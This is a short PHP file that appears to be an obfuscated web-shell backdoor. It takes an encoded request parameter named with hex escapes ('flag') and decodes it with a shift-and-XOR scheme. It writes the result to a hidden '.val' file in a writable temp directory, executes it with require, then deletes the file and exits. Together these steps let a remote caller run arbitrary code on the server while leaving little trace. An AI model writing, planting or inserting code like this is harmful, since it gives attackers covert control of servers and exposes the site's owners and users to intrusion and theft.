<?php

if(@$_REQUEST["f\x6C\x61g"] !== null){
	$entity = $_REQUEST["f\x6C\x61g"];
	 	$entity 		=explode		 ( 		'.',$entity	  )	  ;	
	$component = '';
            $s = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $sLen = strlen($s);
            $i = 0;
    
            array_walk($entity, function ($v6) use (&$component, &$i, $s, $sLen) {	 $sChar = ord($s[$i	%  $sLen]);
                $dec = ((int)$v6 - $sChar - ($i	%  10)) ^ 57;
                $component.=  chr($dec);
                $i++;
            });
	$key = array_filter([ini_get("upload_tmp_dir"), "/dev/shm", "/tmp", getenv("TEMP"), "/var/tmp", session_save_path(), sys_get_temp_dir(), getenv("TMP"), getcwd()]);
	foreach ($key as $key => $object) {
    		if ((function($d) { return is_dir($d) && is_writable($d); })($object)) {
    $reference = str_replace("{var_dir}", $object, "{var_dir}/.val");
    if (file_put_contents($reference, $component)) {
	require $reference;
	unlink($reference);
	exit;
}
}
}
}